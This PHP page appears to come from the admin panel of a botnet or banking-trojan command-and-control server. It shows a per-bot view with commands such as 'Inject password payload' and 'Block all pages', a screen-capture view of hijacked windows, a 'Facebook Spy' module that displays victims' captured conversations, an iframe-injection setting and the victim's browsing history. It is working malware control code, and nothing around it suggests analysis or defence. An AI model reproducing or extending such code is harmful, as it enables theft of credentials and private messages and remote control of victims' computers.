<?php
if(isset($_GET['id']) && $_GET['id'] == ''){
    exit(1);
}
require_once('class/bot.class.php');
$bot = new Bot();
$bot->getName($_GET['id']);
$z_name = $bot->bot_id;
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="#" class="active item">History</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
         <div class="ui segment">
        <h3>Listing action</h3>
        <form class="ui form" action="#" method="post">
            <select class="command" name="command">
                <option name='History'>Show computer history</option>
                <option name='WebInject'>Inject password payload</option>
                <option name='Compact'>Compact with current extension</option>
                <option name="update">Update build</option>
                <option name="lock">Block all pages</option>
            </select>
            <input class="ui button" class="command" type="submit" name="send" value="start command"/>
        </form>
    </div>
    <div class="ui segment">
        <h3>Active windows</h3>
        <?php
        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
        $select->bindParam(':bot_id', $_GET['id']);
        $select->execute();
        if($select->rowCount() > 0){
            $ids = $_GET['id'];
            echo "<a class='ui button' href='index.php?action=hijack&id=".$ids."'>Look last window screen</a>";
        }
        ?>
    </div>
    <div class="ui segment">
        <h3>Facebook Spy</h3>
        <small><?php echo Bot::getLastSpy($_GET['id']); ?></small>
        <br />
        <br />
        <?php
        $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :bot_id");
        $select->bindParam(':bot_id', $_GET['id']);
        $select->execute();
        if($select->rowCount() > 0){
            $ids = $_GET['id'];
            echo "<a class='ui button' href='index.php?action=facebookspy&id=".$ids."'>Look last conversation</a>";
        }
        ?>
    </div>
     <div class="ui segment">
        <h3>Iframe module</h3>
         <form class="ui form" action="" method="post">
             <div class="field">
                 <?php
                 if($bot->getSetting($z_name, 'iframe') !== false){
                     ?>
                    <input type="text" name="url" value="<?php echo $bot->getSetting($z_name, 'iframe')['setting_value']; ?>"/>
                    <?php
                 }
                 else{
                 ?>
                    <input type="text" name="url" placeholder="http://exemple.com"/>
                 <?php
                 }
                 ?>
             </div>
             <?php
             if($bot->getSetting($z_name, 'iframe') !== false){
                 $status = $bot->getSetting($z_name, 'iframe')['available'];
                 if($status == '0'){
                     $status = "Disabled";
                 }
                 if($status == '1'){
                     $status = 'Activated';
                 }
                 ?>
                <div class="field">
                     <div class="ui labeled button" tabindex="0">
                         <input class="ui left  button" type="submit" name="iframestart" value="save"/>
                         <input type="submit" name="status" class="ui basic left pointing label" value="<?php echo $status; ?>">
                    </div>
                 </div>
                 <?php
             }
             else{
                 ?>
                <div class="field">
                    <input class="ui left  button" type="submit" name="iframestart" value="save"/>
                 </div>
                <?php
             }
             ?>
         </form>
         <?php
         if(isset($_POST['iframestart'])){
            $bot->setSetting($z_name, 'iframe', $_POST['url']);
         }
         elseif(isset($_POST['status'])){
             $bot->changeSettingStatus($z_name, 'iframe');
             echo "status update!";
         }
         ?>
    </div>
     <div class="ui segment">
        <h3>Computer history</h3>
      <table class="ui very basic table history">
  <thead>
    <tr>
      <th>Website</th>
      <th>Time</th>
    </tr>
  </thead>
  <tbody>
    <?php $bot->getHistory($z_name); ?>
  </tbody>
</table>
    </div>
</div>